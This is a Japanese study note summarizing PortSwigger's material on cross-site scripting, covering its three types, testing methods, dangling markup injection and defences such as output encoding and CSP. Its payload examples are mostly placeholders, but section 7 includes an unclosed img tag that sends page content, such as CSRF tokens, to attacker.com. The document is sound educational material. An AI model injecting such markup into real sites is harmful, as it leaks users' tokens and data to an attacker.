# クロスサイトスクリプティング（XSS）学習資料

> 出典：[PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting)

---

## 1. クロスサイトスクリプティング（XSS）とは？

クロスサイトスクリプティング（XSS）は、攻撃者が脆弱なアプリケーションとユーザーのやり取りを侵害することを可能にする **Webセキュリティの脆弱性** です。

攻撃者はXSSを悪用することで、異なるWebサイトを互いに分離するよう設計された **同一オリジンポリシー** を回避できます。

### 攻撃者が可能にすること

- 被害者ユーザーへの **なりすまし**
- ユーザーが実行できるあらゆる **操作の代行**
- ユーザーがアクセスできる **データの読み取り**
- ユーザーの **ログイン認証情報の窃取**
- Webサイトの **仮想的な改ざん**
- Webサイトへの **トロイの木馬的機能の埋め込み**

> 被害者が特権アクセスを持つユーザーであった場合、アプリケーション全体の完全な制御が可能になります。

---

## 2. XSSはどのように機能するか？

脆弱なWebサイトを操作して **悪意のあるJavaScriptをユーザーに返させる** ことで機能します。悪意のあるコードが被害者のブラウザ内で実行されると、攻撃者はそのアプリケーションとのやり取りを完全に侵害できます。

---

## 3. 概念実証（PoC）の確認方法

XSS脆弱性の存在を確認するには、ブラウザに任意のJavaScriptを実行させるペイロードをパラメータに注入します。

### 使用する関数

| 関数 | 状況 |
|------|------|
| `alert()` | 従来から使われている基本的なPoC関数 |
| `print()` | **現在推奨**。Chrome v92以降、クロスオリジンiframeでは`alert()`が使用不可のため |

> Chrome バージョン92（2021年7月20日〜）以降、クロスオリジンiframeから`alert()`を呼び出すことができなくなりました。

## 4. XSS攻撃の3種類

### 4-1. 反射型XSS（Reflected XSS）

**概要：** 攻撃者が細工したHTTPリクエスト内のデータが、そのままレスポンスに「反射」されることで発生します。スクリプトはサーバーに保存されず、**悪意のあるURLに被害者を誘導する**ことで攻撃が成立します。

**攻撃の流れ：**

1. 攻撃者がスクリプトを埋め込んだURLを作成する
2. 被害者がそのURLにアクセスする
3. サーバーがスクリプトをレスポンスにそのまま含めて返す
4. 被害者のブラウザでスクリプトが実行される

**コード例：**

```
# 通常のリクエスト
https://insecure-website.com/status?message=All+is+well.
→ <p>Status: All is well.</p>

# 攻撃者が細工したURL
https://insecure-website.com/status?message=<script>/* 悪意のあるコード */</script>
→ <p>Status: <script>/* 悪意のあるコード */</script></p>
```

---

### 4-2. 蓄積型XSS（Stored XSS）

**概要：** 悪意のあるスクリプトがアプリケーションのデータベース等に **永続的に保存** され、そのデータを参照するすべてのユーザーに影響を与えます。永続型・セカンドオーダーXSSとも呼ばれます。

**主な感染経路：**

- ブログのコメント欄
- チャットルームのニックネーム
- 顧客注文の連絡先情報
- SMTP経由のメールを表示するWebメールアプリ
- ソーシャルメディアの投稿を表示するマーケティングアプリ

**攻撃の流れ：**

1. 攻撃者がスクリプトを含むデータをアプリケーションに送信・保存させる
2. 別のユーザーがそのデータを含むページにアクセスする
3. **データが削除されない限り**、アクセスするユーザー全員が攻撃を受ける

**コード例（掲示板への悪意あるメッセージ）：**

```html
<p><script>/* 悪意のあるコード */</script></p>
```

---

### 4-3. DOMベースXSS（DOM-based XSS）

**概要：** サーバーサイドではなく、**クライアントサイドのJavaScript** が脆弱点となります。サーバーは正常なレスポンスを返しますが、ブラウザ上のJSがURLパラメータ等の入力値を読み取ってDOMを書き換える際にスクリプトが実行されます。

**反射型・蓄積型との違い：**

| 種類 | 脆弱点の場所 |
|------|-------------|
| 反射型 | サーバーサイド |
| 蓄積型 | サーバーサイド（DB） |
| DOMベース | **クライアントサイド（JS）** |

**コード例：**

```javascript
// 脆弱なJavaScriptの例
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
```

```html
<!-- 攻撃ペイロード例 -->
You searched for: <img src=1 onerror='/* 悪意のあるコード */'>
```

## 5. XSS脆弱性の影響

XSS攻撃の影響はアプリケーションの性質・機能・ユーザーの権限によって異なります。

| アプリケーションの種類 | 影響度 |
|----------------------|--------|
| 匿名ユーザー向けの公開情報サイト | 最小限 |
| 銀行取引・メール・医療記録などを扱うアプリ | 深刻 |
| 特権ユーザーが侵害された場合 | 致命的（全機能・全データの完全制御） |

---

## 6. XSS脆弱性の発見とテスト方法

### 自動テスト

XSS脆弱性の大部分は **Burp Suiteのウェブ脆弱性スキャナー** を使用して迅速かつ確実に発見できます。

### 手動テスト

#### 反射型・蓄積型XSSの手動テスト手順

1. アプリケーションのすべてのエントリポイントに **短い英数字などのユニークな入力** を送信する
2. 送信した入力が **HTTPレスポンスに返される箇所** をすべて特定する
3. 各箇所で細工した入力で **任意のJavaScriptを実行できるか** を個別にテストする
4. XSSが発生するコンテキストを判断し、適切なペイロードを選択して悪用する

#### DOMベースXSSの手動テスト手順

1. URLパラメータに **ユニークな入力値** を配置する
2. ブラウザの **開発者ツール** を使用してDOMでその入力を検索する
3. 各箇所が **悪用可能かどうか** をテストする

> **注意：** URL以外の入力（`document.cookie`など）やHTML以外のシンク（`setTimeout`など）が関係するDOMベース脆弱性は、JavaScriptコードを直接レビューする必要があり、非常に時間がかかります。Burp Suiteはこれを静的・動的解析の組み合わせで自動化します。

## 7. ダングリングマークアップインジェクション

### 概要

ダングリングマークアップインジェクションは、**完全なXSSの悪用が不可能な状況**（入力フィルターやその他の防御策が存在する場合）で、クロスドメインでデータを取得するために使用できる技術です。

### 何ができるか

XSSが完全には成立しない環境でも、以下のような **他のユーザーに見えている機密情報を取得** できます。

- 不正な操作を実行するために使用できる **CSRFトークン**
- ページ上に表示されているその他の **機密情報**

### 仕組み

通常のXSSのように完結したスクリプトを注入するのではなく、**閉じられていないHTMLタグ（ダングリングマークアップ）** を注入することで、ページの後続のコンテンツを外部サーバーへ送信させます。

```html
<!-- 注入例：src属性を閉じずに放置することで後続のHTML内容を外部へ送信 -->
<img src='https://attacker.com/?data=
```

> ページのHTMLがこの後に続く機密情報を含む場合、その内容が攻撃者のサーバーへのリクエストに含まれて送信されてしまいます。

## 8. XSS攻撃の防止方法

XSS脆弱性の防止には、以下の対策の **組み合わせ** が重要です。

### ① 入力時のフィルタリング

ユーザー入力を受け取る時点で、期待される有効な入力に基づき **できる限り厳密にフィルタリング** します。

### ② 出力時のエンコード

ユーザー制御可能なデータをHTTPレスポンスに出力する際、アクティブなコンテンツとして解釈されないよう **エンコード** します。出力コンテキストに応じて以下を使い分けます。

- HTMLエンコード
- URLエンコード
- JavaScriptエンコード
- CSSエンコード

### ③ 適切なレスポンスヘッダーの使用

HTMLやJavaScriptを含まないレスポンスには、以下のヘッダーを使用してブラウザが意図した方法で解釈するよう制御します。

- `Content-Type`
- `X-Content-Type-Options`

### ④ コンテンツセキュリティポリシー（CSP）

**最後の防衛ライン** として、CSPを使用して残存するXSS脆弱性の深刻度を軽減します。CSPはブラウザが実行できるスクリプトのソースを制限するブラウザのメカニズムです。

> CSPを採用しているアプリケーションにXSSのような動作が含まれる場合、CSPが悪用を妨げる・防止する可能性があります。ただし多くの場合、CSPを回避して基礎となる脆弱性を悪用することも可能です。

## まとめ

```
XSS
├── 反射型     → 攻撃者が細工したURLに被害者を誘導（サーバーサイド）
├── 蓄積型     → スクリプトをDBに保存し全ユーザーに影響（サーバーサイド）
└── DOMベース  → クライアント側のJSがDOMを書き換える際に発生（クライアントサイド）

発見・テスト方法
├── 自動    → Burp Suite のウェブ脆弱性スキャナー
├── 手動①  → 反射型・蓄積型：エントリポイントへのユニーク入力 → レスポンス確認
└── 手動②  → DOMベース：開発者ツールでDOMを検索 → 悪用可否をテスト

関連技術
└── ダングリングマークアップインジェクション
        → XSSが完全に成立しない環境で機密情報（CSRFトークン等）を外部へ送信する技術

防止策
├── ① 入力フィルタリング
├── ② 出力エンコード（HTML / URL / JS / CSS）
├── ③ 適切なレスポンスヘッダー（Content-Type / X-Content-Type-Options）
└── ④ CSP（コンテンツセキュリティポリシー）
```
